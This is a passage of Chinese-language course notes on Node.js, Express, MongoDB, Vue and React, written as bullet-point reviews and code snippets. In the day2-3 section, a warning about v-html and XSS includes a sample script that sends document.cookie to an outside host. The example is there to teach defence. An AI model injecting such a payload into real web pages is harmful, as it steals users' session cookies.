# NodeJS
Nodejs是2009由Ryan Dahl推出的运行在服务端的 JavaScript（类似于java,php,python,.net等服务端语言）,
基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。

## day1-2
* 环境
    * nodejs: 10.16.0 / 14.15.4
    * npm: nodejs package management
    * 环境变量
* 模块化开发
    > 模块的作用域为局部作用域
    * 优点
        * 分工
        * 维护
        * 复用
    * 规范
        * commonJS      nodeJS支持的规范（后端）
        * ESModule      ES6模块化（前端）
        * AMD           require.js（前端）
        * CMD           sea.js（前端）
* javascript
    * 前端javascript = ECMAScript + BOM + DOM
        > 在浏览器中运行
    * 后端NodeJS: ECMAScript + 后端概念
        > 在命令行中运行，没有BOM与DOM的概念
* nodeJS多版本共存工具：nvm
    * nvm list  查看已安装nodeJS的版本
    * nvm use   切换nodeJS版本
    * nvm install   安装nodeJS版本
    * nvm uninstall 卸载nodeJS版本
* 运行nodeJS代码
    * REPL：交互式解释器，一般用于测试代码
    * 运行文件： node xxx.js

* commonJS
    * 使用
        > nodeJS把一个文件当作一个模块，都为**局部作用域**，如果想在一个模块中使用另外一个模块的数据，则需要导入导出
        * 导出：
            * `exports`
            * `module.exports`    （推荐）
        * 导入：`require()`
            > 引入模块会自动缓存
            * 引入模块的步骤
                1. 从缓存中引入
                2. 从原生模块引入
                3. 从`node_modules`中引入
                    * package.json
                        * main
                4. 缓存模块

    * 模块分类
        * 内置模块：nodejs自带的模块，可以直接引入，不需要加路径
        * 自定义模块：自己编写的模块，引入时需要添加相对路径
        * 第三方模块: 别人写人模块
            1. 安装：
                * npm install xxx
                * cnpm
                * yarn: 
                    * `yarn add xxx`
                    * `yarn add global xxx`
            2. 引入: 与原生模块一致
* 利用node实现http服务器
    * 请求：request
        > 客户端发给服务器
    * 响应：response
        > 服务器返回给客户端
    * 静态资源
        > html,css,js,img,font,svg....等内容称为静态资源，用来显示这些静态资源的服务器称为静态资源服务器
    * 服务器实现步骤
        * 依赖模块：
            * http
            * fs
                * fs.readFile()/fs.readFileSync()
* nodeJS模块变量
    * __dirname 当前文件所在的路径
    * __filename

## day1-3

### 复习
* 模块化开发
    * 规范
        * commonJS      NodeJS（后端，同步）
        * ESModule      ES6（前端）
            * 导出：export
            * 导入：import
        * AMD           require.js（前端，异步）
        * CMD           sea.js（前端，异步）
            * 导出：define()
            * 导入：require()
    * 分类
        * 内置模块
        * 自定义模块
        * 第三方模块
    * 使用
        * 导出
            * module.exports
            * exports
        * 导入: require()
* nodeJS多版本共存工具：nvm
    * `nvm install [version]`
    * `nvm uninstall [version]`
    * `nvm list`
    * `nvm use [version]`
* http服务器
    > 特点：http(s)请求客户端主动发起，服务器被动响应
    * 请求request
    * 响应response
    * 依赖模块
        * http
        * path
        * fs
        * url
    * mime类型

### 知识点
* express -> Koa
    * express实现静态资源服务器
    ```js
        server.use(express.static('../public'))
    ```
    * express中间件：middleware
        > express中间件是一个函数
        * 分类：
            * 内置中间件
                * express.static()  静态资源服务器中间件
            * 自定义中间件
            * 第三方中间件
        * 使用中间件
            * `use([path],mw1,mw2,mw3....,mwn)`
                * path: 只有路径匹配才进入后面的中间件，如果没有配置path路径则所有请求都进入这个中间件
            * next(): 调用next才能进入下一个中间件
* 利用express中间件实现数据接口
    * 规范：RESTful API
        * 根据请求类型和路径实现不同的接口
    * 请求类型
        * get           查
        * post          增
        * put/patch     改
        * delete        删
    * 获取前端传入参数
        * get请求：通过url参数传到后端，后端通过`req.query`获取
        * 动态路由：后端通过`req.params`获取
        * post/put/patch/delete请求：通过请求体传到后端，后端通过`req.body`获取
            > 利用中间处理不同数据类型:body-parser
            * urlencoded: express.urlencoded
            * json:       express.json()
    * 利用模块化开发思想+路由中间件实现数据接口
        * commonJS
        * express.Router()
## day1-4

### 复习
* express(koa)
    * 中间件middleware
        * 内置中间件
            * express.static()  静态资源服务器
            * express.urlencoded()  处理请求体数据，并格式化到req.body
            * express.json()        处理json数据，并格式化到req.body
            * express.raw()
            * express.Router()      实现模块化路由
        * 自定义中间件
        * 第三方中间件
            * body-parser
    * 使用：use(path,...middleware)
* 路由
    * 数据接口（RESTful API）
        > 利用请求类型与路径实现不同的数据接口
    * 模块化路由
    * 请求类型
        * get       查
        * post      增
        * put/patch 改
        * delete    删
### 知识点
* 图片上传
    * 后端：multer
        * single(field)             单个上传，接收到的文件存入req.file
        * array(field,maxCount)     多个上传，接收到的文件存入req.files
    * 前端：FormData
        * content-type:multipart/form-data
        * set(key,val)
        * append(key,val)
        * get(key)
        * getAll(key)
        * forEach()
        * has()
        * keys()
        * values()
* 跨域
    * 产生跨域的条件：协议、域名、端口三者不一致
    * 为什么会有跨域限制：因为js是一门**客户端脚本语言**（在客户端执行的语言）
    * 跨域解决方案
        * jsonp
            * 原理：利用script标签没有跨域限制的特点来发起请求,返回一段js代码的执行（全局函数的执行代码）
            * 步骤
                1. 定义全局函数
                2. script标签发起请求，传递全局函数名
                3. 删除script，全局函数
        * CORS（推荐）
            * 响应头
                * Access-Control-Allow-Origin
                    * 一个域名
                    * `*`
                * Access-Control-Allow-Methods
                * Access-Control-Allow-Headers
            * 复杂跨域
                * 非GET、HEAD、POST请求。
                * POST请求的Content-Type不是application/x-www-form-urlencoded, multipart/form-data, 或text/plain。
                * 添加了自定义header，例如Token。
        * 服务器代理
            * 原理：利用服务端没有跨域限制的特点在后端向目标服务器发起请求，得到结果后响应给前端
        * 爬虫
            * 原理：爬取目标服务器的所有信息，然后分析过滤得到最终数据
* 页面渲染方式
    * 服务器渲染SSR：html结构在服务器生成并响应给前端，并渲染页面
        > 特点：速度快，SEO友好
        * 步骤
            1. 请求服务器，响应完整的html结构
            2. 浏览器渲染页面
    * 客户端渲染BSR：从服务器请求数据到客户端生成html结构，并渲染到页面
        > 特点：用户体验较好，局部刷新
        * 步骤
            1. 请求服务器，响应一个空的html结构
            2. 浏览器渲染页面，并请求js
            3. 执行js代码，并发起ajax请求
            4. 接收到数据，在客户端生成html结构
            5. 渲染页面
* fs模块
    * 小文件：
        * 读取：fs.readFile()/fs.readFileSync()
        * 写入：fs.writeFile()/fs.writeFileSync()
    * 大文件：Stream
        * 读取流：fs.createReadStream(path)
        * 写入流：fs.createWriteStream(path)

## day1-5

### 复习
* 图片上传
    * FormData
    * multer
* 跨域解决方案
    * jsonp
    * CORS
    * Proxy
    * 爬虫
        * request
        * cheerio
        * 图片：爬取到本地
        * json: 存入本地json
            * fs.writeFile()

### 知识点
* 数据库
    * mySQL
        * 增：insert into
        * 删：delete from 
        * 改：update set
        * 查：select from 
    * MongoDB
        * 增：
            * insertOne(document)
            * insertmany([...document])
        * 删：
            * deleteOne(query)
            * deleteMany(query)
        * 改：
            * updateOne(query,data)
            * updataMany(query,data)
            * save(document)
            ```js
                db.user.updateOne(
                    {username:'laoxie'},
                    {
                        $set:{password:123654,gender:'male'}
                    }
                )
                db.goods.updateOne(
                    {_id:xxx},
                    {
                        // 在原值基础上+1
                        $inc:{hot:1}
                    }
                )
            ```
        * 查: 
            * find(query)
            * findOne(query)

    数据类型     数据库          表/集合          数据
    mySQL       database        table            row
    mongoDB     database        collection       document

    ```js
        [
            {name:'goods1',price:998,sale_price:98},
            {name:'goods2',price:1998,imgurl:'goods2.png',addtime:324597234}
        ]
    ```
* 在Node中使用mySQL
    * 驱动：mysql模块
        * 连接对象
        * 连接池
* 在Node中使用mongodb
    * 驱动：mongodb/mongoose
    * 增删该查的封装

* 项目验收
* 提交最新代码到github
* 上线
* 发邮件
    * 发老谢：xiejinrong@1000phone.com
    * 抄小谢：xiedongling@1000phone.com

    * 邮件内容
        * 原网站地址
        * 上线地址
        * github地址
        * 页面介绍
            * 首页
            * 购物车
            * 注册
            * 登录
        * 截图：至少3张
        * 录视频
* 提交项目到：http://manage.qfh5.cn/

## day2-1

### 复习
* MongoDB CRUD
    * 增：
        * insertOne(document)
        * insertMany([document,...])
    * 删
        * deleteOne(query)
        * deleteMany(query)
    * 改
        * updateOne(query,data)
        * updateMany(query,data)
        * save(document)
        * 修改操作符
            * $set: 修改
            * $inc: 递增
            * $push: 追加
            * $addToSet：添加（自动去重）
            * ...
    * 查
        * find(query)
        * findOne(query)

* 在NodeJS中使用Mongo
    * 驱动：mongodb模块

### 知识点
* http/https特点
    * 短链接：请求并响应完成，连接就会断开
    * 客户端主动，服务器被动
        * 客户端不断发请求：轮询
* WebSocket
    > HTML新特性
    * 长连接：与服务器建立连接后不会断开
    * 客户端
        * 浏览器是否支持WebSocket
        * 方法
            * send()：向服务端推送消息
            * close(): 在客户端断开与服务端的连接
        * 事件
            * open
        ```js
            var socket = new WebSocket('ws://localhost:1001');

            // 客户端向服务器发送消息
            socket.send('hello')
        ```
    * 服务器
        > 依赖模块：ws，能主动发起请求
        * 方法
            * send()    向客户端发送消息
        * 事件
            * connection
        ```js
            const server = new ws.Server({
                port:1001
            });
        ```
    * 应用：多人聊天室（微信群等）
        1. 某个客户端发送消息到服务器
            > 客户端主动
        2. 服务器把消息广播给所有客户端
            > 服务器主动


## day2-2

### 面试题
* 移动端click事件穿透bug
    * 移动端click事件有300ms左右延迟
    * touch
        * touchstart
        * touchend
        * touchmove
    * zepto.js手势
        * tap
        * longtap
        * swiper,swiperLeft,swiperRight,swiperUp,swiperDown

### 知识点
* Vue
    * 思维转变(重要)
        * 从**节点操作**转变成**数据操作**
        * 把节点操作交给Vue框架去处理
    * 数据绑定
        * 单向绑定
            * {{}}
            * v-text
            * v-html
            * v-bind:attr    绑定到属性
        * 双向绑定
            * v-model
                * 数据层->视图层: setter
                * 视图层->数据层: 事件
            * v-model的原理：单向绑定(v-bind)+事件(v-on)
            ```js
                <input type="text" v-model="username" />
                <input type="text" v-bind:value="username" v-on:input="username=$event.target.value">
            ```
    * 指令（html属性）
        * v-model   双向绑定
        * v-text    单向绑定
        * v-html    单向绑定
        * v-bind    属性绑定
        * v-on      事件绑定
        * v-for     遍历
        * v-show    是否显示（显示隐藏）
            > 频繁显示隐藏建议使用v-show
        * v-if      是否显示（节点创建与销毁）
            * v-else-if
            * v-else
* 架构模式
    * MVC
        > 耦合度高
        * Model         数据层
        * View          视图层
        * Controller    控制层
    * MVP
        * Model
        * View
        * Presenter     
    * MVVM
        * Model
        * View
        * ViewModel     
* 响应式属性
    > 特点：监听数据的修改，并自动更新视图
    * 原理：存储器属性getter&setter
    * 在Vue中如何设置响应式属性
        * 设置初始值
        * Vue.set(target,key,val)/this.$set(): 给target添加响应式属性
            > target不能是vue实例和data根数据对象

* 属性特性
    * 值属性（有值的属性）
        * configurable  可配置型
        * enumerable    可枚举性
        * writable      可写性
        * value
    * 存储器属性：属性本身没有值，但可以监听到修改与读取，一般用于代理其他数据
        * configurable 
        * enumerable
        * get
        * set

## day2-3

### 复习
* 响应式属性
    * 核心：存储器属性getter&setter
    * 设置存储器属性的方式
        * data: 实例化Vue时，会遍历data下所有属性，并把它们转成存储器属性
        * Vue.set()/this.$set
* 双向：v-model
    * 单向: v-bind:value
    * 事件
* 指令
    * v-text
    * v-html    慎用，防止xss攻击（过滤破坏性代码），除非你信任数据内容
        ```js
            <script>
                location.href = 'http://laoxie.com?cookie='+document.cookie
            </script>
        ```
    * v-bind
        > 简写： :
    * v-model
    * v-for
    * v-on
        > 简写：@
    * v-show
    * v-if
        * v-else-if
        * v-else


### 知识点
* computed: 计算属性
    > 核心：getter & setter
* 实例属性&方法
    * this.$refs: 保存所有ref属性对应的节点
    * this.$el: 实例化时配置的el（视图对应的节点）
    * this.$data: 实例化时配置的data
    * this.$options: 实例化时的所有配置信息
    * this.$set()/Vue.set()
    * this.$delete()/Vue.delete()
* 事件
    * event
        * 默认为事件处理函数的第一个参数
        * 如果手动传参，需要手动传递event对象
    * 传参
    * 修饰符：
        * 键盘事件修饰符
            * 复制：@keyup.ctrl.67
        * 鼠标事件修饰符
* 过滤器filter
    * 定义
        * 全局过滤器：Vue.filter(name,definition)
        * 局部过滤器: filters
    * 使用：|
        * {{}}
        * v-bind
    * 练习
        * 1000000 -> 1,000,000

## day2-4

### 复习
* computed：计算属性
    > 本质为存储器属性getter&setter
    * 特点：自动缓存，只有在computed属性依赖的数据发生改变时才会重新执行里面的代码，否则从缓存中读取
    ```js
        computed:{
            checkAll(){},
            checkAll:{
                get(){},
                set(){}
            }
        }
    ```
* 实例属性&方法
    * $el
    * $data
    * $refs
    * $options
    * $props
    * $attr
    ```js
        new Vue({
            ...
        })
    ```
    * $set()/Vue.set()
    * $delete()/Vue.delete()
* 全局方法（Vue静态方法）
    * Vue.set()
    * Vue.delete()
    * Vue.filter()
* 事件
    > 事件绑定完整格式：v-on:事件类型.修饰符="事件处理函数"
    * 绑定：v-on, @
    * event
        * 默认事件处理函数的第一个参数
        * 如果传参，则需手动传递$event
    * 传参
        ```js
            <button @click="change"></button>
            <button @click="change(id,$event)"></button>
        ```
    * 修饰符
        * 键盘事件修饰符
        * 鼠标事件修饰符
* 过滤器
    * 定义
        * 全局  Vue.filter(name,definition)
            * definition是一个函数，第一个参数为待过滤的值，后面的为过滤器参数（可选）
        * 局部  filters
    * 使用：|
        > 可以同时使用多个过滤器
        * 在{{}}中使用
        * 在v-bind中使用

### day2-4
* 组件化开发
    > 封装、模块化
    * 优点
        * 分工更容易
        * 维护更方便
        * 复用
    * 定义
        > 组件就是Vue实例（定义一个组件可以理解为创建一个标签）
        * 全局组件: Vue.component(name,options)
        * 局部组件: components:{name1:options,name2:options}
    * 使用
        ```js
            <组件名/>
            <组件名></组件名>
        ```
    * 配置参数
        * el        视图属性，组件配置没有
        * template  模板属性
        * render    渲染方法
    * 组件通讯
        * 父->子：props
            1. 父组件操作：给子组件定义属性并传递数据
            2. 子组件操作：
                1. props接收数据，接收的数据会自动称为实例的属性
                    > 注意大小写问题
                    * 如果不接收，则props属性自动成为组件根元素的属性
                    * props数据类型校验
                        * 类型
                        * 必填
                        * 默认值
                2. 在组件中通过this.xxx使用
        * 子->父
            1. 父组件操作：给子组件自定义事件，并传递父组件的方法作为事件处理函数
                > v-on:事件="父组件方法"
            2. 子组件操作：子组件通过`this.$emit(type,data)`触发自定义事件

* 模块化开发todolist
    1. 划分组件
    2. 定义组件
    3. 组件通讯
        * 父->子：props
        * 子->父：
            * 自定义事件
            * 把父组件函数传到子组件执行
        * 多层级组件
            * 逐层传递（不推荐）
            * Bus事件总线
                1. 定义一个父组件和子组件都能访问到的Vue实例
                2. 接收方给Bus绑定事件，事件处理函数为接收方的方法
                    > Bus.$on()
                3. 发送方触发Bus事件，并传递参数
                    > Bus.$emit()

## day2-5

### 知识点
* key
    > key一定是**唯一**且**稳定**的值
    * 在Vue中，为了提高页面性能，Vue会尽量较少节点操作（对比节点的前后状态，过滤掉一些没必要的节点操作(找出差异项)）
        * 如过Vue无法判断前后节点的对应状态，为了提升性能，采用**复用原则**（不对节点进行创建与销毁，而是改变它的内容）
        * diff算法
            * 虚拟节点（VirtualDOM）：一个结构类似于真实DOM节点的js对象
            ```js
            // 初始状态
                {
                    type:'p',
                    props:{},
                    children:[{
                        type:'span',
                        props:{},
                        children:'laoxie',
                        key:11
                    },{
                        type:'strong',
                        props:{},
                        children:'xxx'
                        key:12
                    }]
                    key:1
                }

                // 结束状态
                {
                    type:'p',
                    props:{},
                    children:[{
                        type:'span',
                        props:{},
                        children:'tiantian'
                        key:11
                    },{
                        type:'strong',
                        props:{},
                        children:'xxx'
                        key:12
                    }]
                    //key:1
                }
            ```

## day3-1

### 复习
* 虚拟DOM
    > 虚拟节点（js对象）, diff算法, Vue的diff算法会对比虚拟DOM前后状态，找出差异项，然后更新差异项
    * 节点的频繁操作会影响页面性能
        ```js
            btn.innerText = 10;
            btn.innerText = 20;
            btn.innerText = 30;
            btn.innerText = 10;

            setter(){

                render()
            }

            // 创建与写入
            let btn = document.createElement('button')
            btn.innerText = 'xxx'
            document.body.appendChild(btn);
            // 销毁
            document.body.removeChild(btn)
        ```
    * key
        > 作为虚拟节点的标识，值需要唯一且稳定，建议在for循环中都添加key


### 知识点
* Vue-cli： Vue脚手架
    * 安装：
        ```bash
            #npm 
            npm install -g @vue/cli

            #yarn
            yarn global add @vue/cli
        ```
    * 创建项目
        ```bash
            vue create myapp
        ```
    * webpack构建工具
        * vue-loader
* 单文件组件
    > 后缀名为：`.vue`
* Vue版本
    * 完整版=运行时+编译器
    * 运行时版本（runtime）
    * 编译器:来将模板字符串编译成为 JavaScript 渲染函数的代码

* 模块化
    * 规范
        * CommonJS      NodeJS
        * ESModule      ES6
        * AMD           require.js
        * CMD           sea.js
    * 导出: export
        >  export后只能跟function、class、var、let、const、default、{}
    * 导入: import
        > 只能静态引入
    * 基本特点
        * 每一个模块只加载一次， 并执行一次，再次加载同一文件，直接从内存中读取；
        * 每一个模块内声明的变量都是局部变量， 不会污染全局作用域；
        * 通过export导出模块，通过import导入模块
        * ES6模块只支持静态导入和导出，只可以在模块的最外层作用域使用import和export 
        ```js
            let path = './home.js'
            // commonsJS
            const home = require('./home.js')
            const home = require(path)

            // ESModule
            import home from './home.js'
            //import home from path; // 不能使用动态路径

            if(xxx){
                import home from './home.js'
            }
        ```
* ESLint
    > 代码规范工具

## day3-2

### 复习
* vue-cli脚手架
    > webpack
    * vue.config.js
* ESModule
    * 导入
        * import xxx from url
        * import {xxx} from url
        * import * as Module from url
    * 导出
        * export    给**模块对象**添加属性
            * var, let, const
            * function
            * class
            * default
            * {}
    * 应用
        * webpack
        * 浏览器
        ```html
            <script type="module">
        ```

### 知识点
* SPA（Single Page Application）: 单页Web应用
    > 一个应用只有一个页面index.html
* MPA（Multiple Page Application）：多页面应用
* vue-router
    * 使用步骤
        1. 安装并引入
            ```js
                // npm i -D vue-router
                import VueRouter from 'vue-router'
            ```
        2. 使用VueRouter插件
            ```js
                Vue.use(VueRouter);
            ```
        3. 实例化路由并配置参数
            ```js
                const router = new VueRouter({
                    // mode:'hash',// history
                    routes:[
                        {
                            path:'/home',
                            component:Home
                        },
                        {
                            path:'/reg',
                            component:Reg
                        },
                        {
                            path:'/login',
                            component:Login
                        }
                    ]
                })
            ```
        4. 把路由注入根实例
            ```js
                new Vue({
                    router
                    ...
                })
            ```
        5. 设置路由组件显示位置
            > 把<router-view/>放到合适的位置
    * 路由类型
        > 通过路由配置的mode属性设置
        * hash
            > url地址有`#`
        * history
            > url没有`#`，更像一个网站
    * 全局组件
        * <router-view/>    用于显示路由组件内容
            * name          命名视图
        * <router-link/>    用于路由跳转
            * to
                * String
                * Object
            * tag
            * event
            * replace
            * active-class
            * exact-active-class
    * 路由跳转
        > 可以通过`path`跳转，也可以通过`name`跳转
        * 声明式导航
        * 编程式导航
            * $router   路由对象
                * push()        跳转并产生浏览记录
                * replace()     跳转但不产生浏览记录
                * go(n)
                * back()
                * forward()
            * $route    当前路由信息

* Vue的UI框架
    * element-ui    饿了么
    * iView         腾讯
    * ant-design    蚂蚁
    * vantUI        有赞

## day3-3

### 复习
* webApp分类
    * SPA
    * MPA
* VueRouter
    * 使用步骤
        1. 安装
        2. 引用并使用插件
        3. 实例化并配置参数
        4. 把实例注入Vue根实例
        5. 设置路由组件显示位置：<router-view/>
            > 命名视图
        
    * 参数
        * mode: hash,history
        * routes
            * path
            * component
            * components
            * name      命名路由
    * 路由跳转
        * 声明式导航：<router-link> 
        * 编程式导航
            * $router   用于跳转
            * $route    当前路由信息

    * ajax请求
        * 原生
            * XMLHttpRequest
            * fetch
        * jQuery/zeptoJS
        * axios
### 知识点
* 加密知识
    * 单向加密
        > 不可逆过程，加密后不能解密
        * 缺点：虽然不能解密，但可以暴力破解
            * 字典破解
        * 解决
            * 限制次数
            * 多次加密
    * 双向加密
        > 加密后可解密
        * 对称加密
            > 加密解密共用一个密钥
            * 缺点：钥匙管理不安全
        * 非对称机密
            * 公钥
            * 私钥
            * 缺点：性能差
        > 解决方案：使用对称加密加密数据，使用非对称加密加密密钥

        * 实际应用：https
            * http: 
                > 端口:80
            * https: ssl
                > 端口：443

* watch
    * 可以监听组件实例下的所有属性（包括属性的子属性）
    * 当监听的属性被修改时，执行相应的函数
    ```js
        watch:{
            username(newVal,oldVal){

            },
            'ruleForm.username':function(newVal,oldVal){

            }
        }
    ```
    > 利用生命周期函数+watch实现导航高亮

* 生命周期函数

## day3-4

### 面试题
* 如何取消ajax请求
    * xhr.abort()
    * axios

### 复习
* 加密知识
    * 单向
    * 双向
        * 对称
        * 非对称
        * https
* watch
    > 监听实例属性（包括子属性）
* 路由传参
    * 动态路由：$route.params


### 知识点
* 局部样式/组件样式
    > 原理：属性选择器
    * scoped： style标签添加scoped属性后，Vue单文件组件在编译时自动给标签添加`data-v-[hash]`自定义属性，然后利用css的是属性选择器实现局部样式
* 面向对象css

* 路由传参
    * 跳转传参
        * 动态路由
            1. 路由配置
            2. 跳转传参
                * $router.push('/goods/123')
                * $router.push({name:'goods',params:{id:123}})
                    > 有多个变量的路由，推荐使用该方式
            3. 接收参数: this.$route.params
        * params
            * 动态路由参数（刷新后依然存在）
            * 非动态路由参数（刷新后消失）
        * query
            > 通过url参数传递
    * 定义传参
        * meta  
        * props
            * Object
            * Function
* 数据持久化
    > 刷新后数据依然存在
* 生命周期函数（钩子函数）
    > 所有生命周期函数中的this指向实例
    * 创建阶段
        * beforeCreate()
        * created()
    * 挂载阶段
        * beforeMount()
        * mounted()
    * 更新阶段
        * beforeUpdate()
        * updated
    * 销毁阶段
        * beforeDestroy
        * destroyed
* 生命周期函数执行过程
* 每个生命周期函数中适合做什么操作
    * created
        * ajax请求
    * mounted
        * 节点操作，定时器
    * destroyed
        * 取消ajax请求，清除定时器等

## day3-5

### 面试题
* 如何取消ajax请求
    * XMLHttpRequest
        > xhr.abort()
    * axios
        1. 给请求添加表示token
        2. 通过cancel()方法取消请求

### 复习
* 路由传参
    * 定义路由时传参
        * meta
        * props
            * Boolean   把$route.params通过props传入组件
            * Object
            * Function
    * 跳转时传参
        * 动态路由
            > 获取：$route.params
        * params
            > 获取：$route.params
        * query
            > 获取：$route.query
    * 数据持久化
        > 刷新后数据依然存在
* 生命周期函数
    * 有哪些生命周期函数
        * 创建阶段
            * beforeCreate
            * created
        * 挂载阶段
            * beforeMount
            * mounted
        * 更新阶段
            * beforeUpdate
            * updated
        * 销毁阶段
            * beforeDestroy
            * destroyed
    * 生命周期函数的执行过程
    * 每个生命周期函数适合做哪些操作

* 组件通讯
    * 父->子：props
    * 子->父：
        * 把父组件方法传到子组件执行
        * 自定义事件
            * v-on/$on()
            * $emit()
    * 兄弟
    * 深层次组件通讯
        * 逐层传递
        * 事件总线 Bus/$root
            * $on()
            * $off()
            * $emit()
    * 组件层级
        * $root     根组件
        * $parent   父组件
        * $children 子组件
    * $ref
        * 用在html元素上，得到节点
        * 用在组件上，得到组件实例
        > 如何在父组件调用子组件方法

### 知识点
* 插槽slot
    * `<slot/>`； 用于承载组件内容
    * 父->子: `v-slot:插槽名称`
        * 默认插槽：名字为default的插槽（default可以省略）
        * 具名插槽：有名字的插槽
            * 使用v-slot指令来显示内容
    * 子->父：作用域插槽`v-slot:插槽名称="scope"`

* VueX
    * 解决的问题
        * 数据共享
        * 监听数据修改，并自动刷新组件
    * 核心配置
        * state     类似于组件的data
        * getters   类似于组件中的computed
        * mutations 唯一修改State的方式，类似于组件中的methods
            > 触发mutation的方式：store.commit('mutation',参数)
    * 使用步骤
        1. 安装并引用
            ```js
                import Vuex from 'vuex'
            ```
        2. 使用Vuex插件
            ```js
                Vue.use(Vuex)
            ```
        3. 实例化Store，并配置核心参数
            ```js
                const store = new Vuex.Store({
                    state,
                    getters,
                    mutations,
                })
            ```
        4. 把store注入Vue根实例
            ```js
                new Vue({
                    //..
                    store
                })
            ```
        5. 使用
            * 获取：在组件中使用state：this.$store.state.xxx
            * 修改：this.$store.commit('mutation',参数)

* 路由守卫
    * 全局守卫
        > 是路由实例的方法，在路由配置文件中编写
        * router.beforeEach(to,from,next)
        * router.resolve(to,from,next)
        * router.afterEach(to,from)
    * 路由独享的守卫
        > 在路由配置中编写
    * 组件内守卫
        > 在组件中编写，类似于生命周期函数
        * beforeRouteEnter(to,from,next)
            > 此时路由组件没有创建完毕，因此不能访问this
        * beforeRouteUpdate(to,from,next)
        * beforeRouteLeave(to,from,next)

    * 应用：页面访问权限控制
        > 建议在router.beforeEach()全局守卫中处理页面访问权限

## day4-2

### 复习
* vuex的作用：数据共享
* 核心配置
    * state             data
    * getters           computed
        * 参数
            * state
    * mutations         methods
        > store.commit(mutation,payload)
        * 参数
            * state
            * payload  
* 使用步骤
    1. 安装引入
    2. 使用
        > Vue.use()
    3. 实例化Store
        ```js
            const store = new Vuex.Store({
                // 核心配置
            })
        ```
    4. 注入Vue根实例
        > 注入后，会给Vue的所有组件添加`$store`
    5. 使用
        * this.$store.state
        * this.$store.getters
        * this.$store.commit()

### 知识点
* 核心配置
    * state             data
    * getters           computed
    * mutations         methods
        > 修改state的唯一方式
        ```js
            // 同步操作
            store.commit('add',goods);

            // 如果数据需要异步获取
            axios.get('/getgoods').then(res=>{
                store.commit('add',res.goods);
            })
        ```
    * actions           methods  
        > 一般用于异步操作，调用方式：store.dispatch(action,payload)
        1. ajax请求，并返回数据
        2. 在action中触发mutation 
    * modules
        > store模块化，默认影响state的获取，getters,mutations,actions不受影响，如果需要独立操作当前模块的getters,mutations,actions，需要设置namespaced:true
* Vuex映射
    * mapState      映射vuex中的state到组件的computed
    * mapGetters    映射Vuex中的getters到组件的computed
    * mapMutations  映射Vuex中的mutations到组件的methods
    * mapActions    映射Vuex中的actions到组件的methods

## day4-5

### 知识点
* 组件
    * 全局：Vue.component(name,options)
    * 局部：components:{name:options}
* 过滤器
    * 全局：Vue.filter(name,definition)
    * 局部：filters:{name:definition}
* 指令
    * 全局：Vue.directive(name,option)
    * 局部：directives:{name:option}
    ```js
        <div v-pre>{{username}}</div>
    ```
* mixin混入
    * 全局：Vue.mixin()
    * 局部：mixins
* provide / inject 依赖注入

    ```js
        // App.vue
        export default {
            data(){
                return {}
            },
            // 父组件使用provide提供依赖
            provide:{
                userInfo:{
                    username:'laoxie',
                    password:123456
                }
            }
            components:{
                datalist:{
                    data(){
                        return {}
                    },
                    //inject:['userInfo'],
                    inject:{
                        //user:'userInfo',
                        user:{
                            from:'userInfo',
                            default:{username:'游客',password:123456}
                        }
                    },
                    mounted(){
                        //this.userInfo
                        this.user
                    }
                }
            }
        }
    ```
* Vue插件
    > 插件可以是一个对象（必须提供 install 方法）。也可以是一个函数，它会被作为 install 方法。并把 Vue 作为参数传入

    ```js
        // 定义一个Vue的插件
        const myPlugin = {
            install(Vue){
                Vue.golbalData = {}
                Vue.prototype.$message = function(){
                    
                }
                Vue.component('table',{})
                Vue.component('form',{
                    minxins:[]
                })
                // ...
                Vue.mixin()
                Vue.filter()
                Vue.directive()
            }
        }
        const myPlugin2 = function install(Vue){

        }

        Vue.use(myPlugin);
        Vue.use(myPlugin2);

        // element-ui
        Vue.use(ElementUI);
    ```

## day5-1

### 知识点：React
* 前端三大框架
* Angular       Google
* React         Facebook
* Vue           
    * cjs   commonJS
    * umd   通用模块
        * AMD/CMD
        * 全局引入
        * commonJS
* 引入
    * react
        > 创建虚拟节点：React.createElement(type,props,children)
    * react-dom/react-native
        > 渲染：ReactDOM.render(VNode,target)
    * babel
* JSX
    * 不能使用关键字
        ```js
            <label htmlFor="username"></label><input id="username">
        ```
    * 属性使用驼峰
    * 必须结束标签
        ```js
            <input type="text" />
            <img src="img/xx.png" />
        ```
* 渲染数据的方式
    * 单向数据绑定：{}
    * 双向数据绑定：单向+事件
    * 列表渲染
    * 事件绑定
        * 事件处理函数
            > this指向的改变
        * event
            > 默认事件处理函数的最后一个参数
        * 传参
            > bind
    * ref
        * 回调函数（推荐）
        

* React组件化开发
     * 好处
        * 复用
        * 分工
        * 迭代
    * 分类
        * 函数组件（无状态组件）
            > 默认没有this指向
        * 类组件（状态组件）
            * state 状态
                * 读取：this.state.xxx
                * 修改：this.setState()
                    > 遵循的原则：不修改原来的数据，而是每次设置一个新的数据, setState为异步操作
            * 生命周期函数
            * this
                > render,construtor,生命周期函数中this默认指向组件实例
    > 注意：函数组件性能更好，推荐优先使用函数组件，只有在函数组件实现不了时才考虑使用类组件

    * 组件通讯
        * 父->子：props
            1. 父组件操作：定义props并传递数据
            2. 子组件操作：
                * 函数组件：props为函数的第一个参数
                * 类组件：
                    * constructor的第一个参数
                    * this.props
        * 子->父：
            * 把父组件的函数通过props传到子组件中执行，并传递参数

* 状态提升
    > 把数据提到多个组件共同的父级

* 组件刷新场景
    1. 组件状态改变时
    2. props数据修改时
        > 子组件依赖父组件数据，当父组件数据修改时，子组件同样会刷新


* event对象中target与currentTarget的区别
    * target: 触发事件的元素
    * currentTarget: 绑定事件的元素

* 受控组件与非受控组件
    > 表单数据受到组件state的控制


## day5-2

### 复习
* react
    * React.createElement()
* react-dom
    * ReactDOM.render(vNode,target)
* JSX
    > 需要babel进行编译，最终会编译成React.createElement()
    * script.type='text/babel'
    * 规则
        * 闭合标签
        * 使用{}绑定数据
        * style必须使用对象
        * 只允许一个根元素
        * 不能使用js关键字
        * 属性必须使用驼峰
* 组件
    * 分类
        * 函数组件（无状态组件）
        * 类组件（状态组件）
            * state     状态
                * 获取：this.state.xxx
                * 设置：
                    * this.setState(newState,callback)
                    * this.setState((prevState)=>({}))
            * 生命周期
            * this
    * 通讯
        * 父->子：props
            > 把数据通过props传入子组件
        * 子->父：
            > 把方法通过props传入子组件中执行
        * 兄弟
            > 状态提升，把数据提升到他们共同的父级
        * 深层级组件通讯
            * 逐层传递（不推荐）
            * 

* 组件刷新场景
    * 自身数据被修改
    * 父组件传入的数据被修改

* 数据渲染方式
    * 数据绑定
        * 单向：{}
        * 双向: 单向+事件
    * 显示html内容
        ```js
